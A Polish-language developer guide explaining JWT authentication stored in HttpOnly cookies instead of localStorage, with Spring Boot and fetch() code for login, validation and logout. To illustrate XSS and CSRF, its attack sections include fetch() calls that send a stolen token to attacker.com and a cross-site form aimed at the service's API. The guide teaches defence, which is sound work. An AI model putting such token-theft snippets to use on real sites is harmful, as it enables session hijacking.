# JWT w Cookies - Wyjaśnienie Proste

## 🎯 TL;DR (Too Long; Didn't Read)

```
Login:  Serwer ustawia cookie z JWT
Żądania: Browser wysyła cookie automatycznie
Logout: Cookie usunięta (Max-Age=0)
```

---

## Cookies vs LocalStorage - Porównanie

### LocalStorage (STARE PODEJŚCIE - Nie Robimy!)

```javascript
// 1. Login
const response = await fetch('/login', {
  method: 'POST',
  body: JSON.stringify({username, password})
});

const {token} = await response.json();

// 2. Frontend: Ręczne przechowanie
localStorage.setItem('token', token);

// 3. Każde żądanie: Ręczne dodanie headera
const headers = {
  'Authorization': `Bearer ${localStorage.getItem('token')}`
};

fetch('/api/users', {headers});

// ❌ PROBLEM: JavaScript może ukraść token!
// Atakujący kod:
fetch('https://attacker.com', {
  body: localStorage.getItem('token')
});
```

### Cookies (NOWE PODEJŚCIE - My!)

```javascript
// 1. Login
const response = await fetch('/login', {
  method: 'POST',
  credentials: 'include', // WAŻNE!
  body: JSON.stringify({username, password})
});

// 2. Browser: Cookie ustawiona automatycznie!
// Set-Cookie: JWT_TOKEN=xyz; HttpOnly; Secure; SameSite=Strict
// (Nic nie musimy robić!)

// 3. Każde żądanie: Cookie wysyłana automatycznie!
fetch('/api/users', {
  credentials: 'include' // WAŻNE!
});

// ✅ BEZPIECZNE: JavaScript nie może dostać tokenu!
// Atakujący kod:
console.log(document.cookie); // Pusty! (z powodu HttpOnly)
```

---

## Co To Jest JWT?

### Struktura Tokenu

```
eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJqb2huZG9lIiwiaWF0IjoxNjczNjEyMDAwLCJleHAiOjE2NzM2OTg0MDB9.signature
│                      │                                                    │
Header                 Payload (Claims)                                   Signature
```

### Decoded:

```json
// Header
{
  "alg": "HS512",
  "typ": "JWT"
}

// Payload
{
  "sub": "johndoe",        // Który użytkownik
  "userId": 1,             // Jego ID
  "iat": 1673612000,       // Kiedy wydany
  "exp": 1673698400        // Kiedy wygasa (24h później)
}

// Signature
HMACSHA512(header + payload, SECRET_KEY)
```

---

## Jak Działa w Praktyce?

### 1. Rejestracja (Brak Tokenu)

```
Frontend:
  POST /api/users/register
  { username, email, password }

Server:
  ✓ Sprawdzi duplikaty
  ✓ BCrypt hasło
  ✓ Zapisze w bazie
  → 201 Created
  → { id, username, email }
  → (Brak tokenu - user musi się zalogować!)
```

### 2. Logowanie (Token Ustawiany w Cookie)

```
Frontend:
  POST /api/users/login
  { username, password }
  credentials: 'include'

Server:
  ✓ Sprawdzi username
  ✓ BCrypt.matches(password)
  ✓ JWT.generate(username)
  → 200 OK
  → Set-Cookie: JWT_TOKEN=eyJ...; HttpOnly; Secure; SameSite=Strict; Max-Age=86400
  → { id, username, email }
  → (Tokenu NIE w body! Jest w cookies!)

Browser:
  Automatycznie zapisuje cookie
  (Nie musimy nic robić!)
```

### 3. Żądanie Autentykowane (Cookie Wysyłana)

```
Frontend:
  GET /api/users/1
  credentials: 'include'

Browser wysyła:
  Cookie: JWT_TOKEN=eyJ...

Server:
  JwtAuthenticationFilter:
    1. Wyodrębnia JWT z cookies
    2. Sprawdza sygnaturę
    3. Sprawdza expiration
    4. Ustawia SecurityContext
  → 200 OK
  → { user data }
```

### 4. Wylogowanie (Cookie Usunięta)

```
Frontend:
  POST /api/users/logout
  credentials: 'include'

Server:
  → 200 OK
  → Set-Cookie: JWT_TOKEN=; Max-Age=0
  → { message: "Logged out" }

Browser:
  Automatycznie usuwa cookie
  (Sesja skończona!)
```

---

## Flagi Cookies - Co Oznaczają?

```
Set-Cookie: JWT_TOKEN=eyJ...;
  HttpOnly;              // ← Nie dostępne z JS (ochrona XSS)
  Secure;                // ← Tylko HTTPS (ochrona MITM)
  SameSite=Strict;       // ← Ochrona CSRF
  Path=/;                // ← Dostępna na całej ścieżce
  Max-Age=86400          // ← Wygaśnie za 24h
```

### Interpretacja:

| Flaga | Znaczenie |
|-------|-----------|
| `HttpOnly` | Atakujący JS **nie może** czytać `document.cookie` |
| `Secure` | Cookie wysyłana **tylko** przez HTTPS |
| `SameSite=Strict` | Cookie wysyłana **tylko** z same-site requestów |
| `Path=/` | Cookie dostępna na **wszystkich** ścieżkach |
| `Max-Age=86400` | Cookie **autom. usuwa się** za 24h |

---

## Ataki i Ochrona

### 1. XSS Attack (JavaScript na stronie)

**Bez Ochrony (localStorage):**
```javascript
// Atakujący kod na naszej stronie:
fetch('https://attacker.com', {
  body: 'Ukradnięty token: ' + localStorage.getItem('token')
});
// ❌ SUKCES - token wysłany do atakującego!
```

**Z Ochroną (HttpOnly cookies):**
```javascript
// Atakujący kod:
fetch('https://attacker.com', {
  body: document.cookie // HttpOnly - PUSTY!
});
// ✅ FAILURE - token w cookies nie widoczny!
```

### 2. CSRF Attack (Fake Form z Innej Strony)

**Bez Ochrony (SameSite):**
```html
<!-- attacker.com -->
<form action="https://api.cityfix.com/users/1" method="POST">
  <input name="phone" value="+48999">
</form>
<!-- ❌ SUKCES - cookie wysłana, atak działa! -->
```

**Z Ochroną (SameSite=Strict):**
```html
<!-- attacker.com -->
<form action="https://api.cityfix.com/users/1" method="POST">
  <input name="phone" value="+48999">
</form>
<!-- ✅ FAILURE - SameSite=Strict nie wysyła cookie! -->
```

### 3. Man-In-The-Middle (Podsłuchanie Sieci)

**Bez Ochrony (HTTP):**
```
Client ─(Token w HTTPie!)─> Attacker ─(Odczytany!)─> Server
```

**Z Ochroną (Secure + HTTPS):**
```
Client ─(Token w HTTPSie!)─> Encrypted ─(Nie widać!)─> Server
```

---

## Wdrażanie - Server-Side (Java)

### 1. Login Endpoint

```java
@PostMapping("/login")
public ResponseEntity<LoginResponse> login(
        @RequestBody LoginRequest request,
        HttpServletResponse response) {
    
    // Walidacja
    LoginResponse loginResponse = userService.login(request);
    
    // Ustawienie JWT w Cookie
    Cookie cookie = new Cookie("JWT_TOKEN", loginResponse.getToken());
    cookie.setHttpOnly(true);              // Nie dostępne z JS!
    cookie.setSecure(true);                // Tylko HTTPS
    cookie.setPath("/");                   // Na całej ścieżce
    cookie.setMaxAge(86400);               // 24 godziny
    cookie.setAttribute("SameSite", "Strict");
    
    response.addCookie(cookie);
    
    // ZWRÓĆ BEZ TOKENU!
    LoginResponse withoutToken = LoginResponse.builder()
        .id(loginResponse.getId())
        .username(loginResponse.getUsername())
        // .token() - NIE DODAJEMY!
        .build();
    
    return ResponseEntity.ok(withoutToken);
}
```

### 2. JWT Walidacja

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                   HttpServletResponse response,
                                   FilterChain filterChain) {
        
        String token = null;
        
        // Wyodrębnienie z cookies
        if (request.getCookies() != null) {
            for (Cookie cookie : request.getCookies()) {
                if ("JWT_TOKEN".equals(cookie.getName())) {
                    token = cookie.getValue();
                    break;
                }
            }
        }
        
        // Walidacja
        if (token != null && jwtProvider.validateToken(token)) {
            String username = jwtProvider.getUsernameFromToken(token);
            UsernamePasswordAuthenticationToken auth = 
                new UsernamePasswordAuthenticationToken(username, null, new ArrayList<>());
            SecurityContextHolder.getContext().setAuthentication(auth);
        }
        
        filterChain.doFilter(request, response);
    }
}
```

### 3. Logout Endpoint

```java
@PostMapping("/logout")
public ResponseEntity<Map> logout(HttpServletResponse response) {
    // Usunięcie Cookie
    Cookie cookie = new Cookie("JWT_TOKEN", null);
    cookie.setHttpOnly(true);
    cookie.setSecure(true);
    cookie.setPath("/");
    cookie.setMaxAge(0);  // ← NATYCHMIASTOWE USUNIĘCIE
    
    response.addCookie(cookie);
    
    return ResponseEntity.ok(Map.of("message", "Logged out"));
}
```

---

## Wdrażanie - Client-Side (JavaScript)

### Rejestracja

```javascript
async function register(username, email, password) {
  const response = await fetch('https://api.cityfix.com/users/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, email, password }),
    credentials: 'include'  // Wysyła cookies (jeśli są)
  });
  
  return response.json();
}
```

### Logowanie

```javascript
async function login(username, password) {
  const response = await fetch('https://api.cityfix.com/users/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
    credentials: 'include'  // ← Umożliwia ustawienie cookies
  });
  
  // JWT jest teraz w cookies!
  // Nie zwracamy go!
  
  return response.json();
}
```

### Żądanie Autentykowane

```javascript
async function getProfile(userId) {
  const response = await fetch(
    `https://api.cityfix.com/users/${userId}`,
    {
      credentials: 'include'  // ← Cookie wysyłana automatycznie!
    }
  );
  
  return response.json();
}
```

### Wylogowanie

```javascript
async function logout() {
  const response = await fetch('https://api.cityfix.com/users/logout', {
    method: 'POST',
    credentials: 'include'  // Cookie wysyłana, potem usunięta
  });
  
  return response.json();
}
```

---

## Pytania i Odpowiedzi

### P: Czy token jest szyfrowany?
**O:** Nie. Token jest **podpisany** ale **nie szyfrowany**. Dane są w base64 (łatwo dekodować). Dlatego NIE umieszczaj wrażliwych danych w JWT!

### P: Czy mogę zmienić token?
**O:** Możesz zmienić dane, ale **sygnatury nie będą pasować**. Server odrzuci.

### P: Co jeśli ktoś ukradzienymi tokenem?
**O:** Z `Secure + HttpOnly + SameSite`, token jest trudny do zawinięcia. Ale jeśli już jest skradziony, może być używany. Dlatego **zawsze używaj HTTPS**!

### P: Jak odwołać token?
**O:** JWT stateless - nie można odwołać natychmiast. Token działa do expiration. Rozwiązanie: Blacklist token (tabela w BD) - patrz TODO.

### P: Czy `credentials: 'include'` jest wymagane?
**O:** TAK! Bez tego browser nie wysyła cookies w cross-origin żądaniach.

### P: Czy `Path=/` jest wymagane?
**O:** Nie koniecznie, ale warto dla spójności. `Path=/` = dostępna wszędzie.

---

## Checklist Implementacji

Frontend:
- [ ] `fetch()` z `credentials: 'include'`
- [ ] Logowanie ustawia cookie
- [ ] Cookie wysyłana w żądaniach
- [ ] Wylogowanie usuwa cookie
- [ ] Brak przechowywania tokenu w JS

Server:
- [ ] Cookie ustawiana w login
- [ ] `HttpOnly = true`
- [ ] `Secure = true` (produkcja)
- [ ] `SameSite = Strict`
- [ ] `MaxAge` ustawiony
- [ ] JWT walidacja z cookies
- [ ] Logout usuwa cookie

---

**Koniec!** 🎉

Teraz rozumiesz jak działa JWT w cookies w User Service. Przeczytaj `JWT_COOKIES_GUIDE.md` dla głębszych detali.

